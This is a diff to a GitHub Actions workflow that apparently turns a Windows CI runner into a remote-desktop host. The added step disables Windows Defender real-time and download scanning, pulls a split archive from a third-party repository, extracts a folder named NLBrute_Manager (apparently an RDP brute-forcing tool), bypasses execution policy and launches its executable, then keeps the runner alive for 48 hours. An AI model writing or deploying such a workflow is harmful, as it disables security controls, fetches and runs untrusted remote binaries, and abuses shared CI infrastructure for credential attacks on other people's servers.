@@ -48,7 +48,69 @@ jobs:
           Write-Host "  >> Open mstsc and connect to: $ts_ip" -ForegroundColor Magenta
           Write-Host "==================================================" -ForegroundColor Green
 
-      - name: 4. Keep Server Alive (48 Hours)
+      - name: 4. Setup Environment & Deploy Files
+        shell: powershell
+        run: |
+          # 1. Define Paths
+          $baseDir = "$env:USERPROFILE\Desktop\Downloads\multinl_zip"
+          $targetDir = "$baseDir\multinl\NLBrute_Manager"
+          
+          # 2. Create Directory Structure
+          New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
+          Set-Location -Path $baseDir
+
+          # 3. Disable Windows Defender to prevent file quarantine
+          Write-Host "Disabling Windows Defender Real-Time Monitoring..." -ForegroundColor Cyan
+          Set-MpPreference -DisableRealtimeMonitoring $true
+          Set-MpPreference -DisableIOAVProtection $true
+          
+          # 4. Download Split Zip Files (Using Raw URLs)
+          $filesToDownload = @(
+            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z01",
+            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z02",
+            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z03",
+            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.zip"
+          )
+
+          foreach ($url in $filesToDownload) {
+              $fileName = Split-Path $url -Leaf
+              Write-Host "Downloading $fileName..." -ForegroundColor Yellow
+              Invoke-WebRequest -Uri $url -OutFile $fileName
+          }
+
+          # 5. Extracting the Archive
+          # We use the main .zip file. For split zips, they must be in the same folder.
+          Write-Host "Extracting multi-part archive..." -ForegroundColor Cyan
+          try {
+              Expand-Archive -Path "$baseDir\multinl_zip.zip" -DestinationPath $baseDir -Force
+              Write-Host "Extraction successful." -ForegroundColor Green
+          } catch {
+              Write-Host "Extraction failed. Attempting manual extraction via Shell..." -ForegroundColor Red
+              # Fallback if Expand-Archive struggles with split volumes
+              & cmd /c "tar -xf multinl_zip.zip -C $baseDir"
+          }
+
+          # 6. Launch the Application
+          Write-Host "Searching for executable in $targetDir..." -ForegroundColor Cyan
+          if (Test-Path $targetDir) {
+              $exeFiles = Get-ChildItem -Path $targetDir -Filter "*.exe" -Recurse
+              if ($exeFiles.Count -gt 0) {
+                  $exeToRun = $exeFiles[0].FullName
+                  Write-Host "Found: $exeToRun. Launching..." -ForegroundColor Green
+                  
+                  # Set Execution Policy to Bypass for the current process
+                  Set-ExecutionPolicy Bypass -Scope Process -Force
+                  
+                  # Launch the app without blocking the workflow
+                  Start-Process -FilePath $exeToRun -WorkingDirectory $targetDir -WindowStyle Normal
+              } else {
+                  Write-Host "No .exe found in $targetDir" -ForegroundColor Red
+              }
+          } else {
+              Write-Host "Target directory $targetDir not found after extraction." -ForegroundColor Red
+          }
+
+      - name: 5. Keep Server Alive (48 Hours)
         run: |
           for ($i = 1; $i -le 2880; $i++) {
             Start-Sleep -Seconds 60
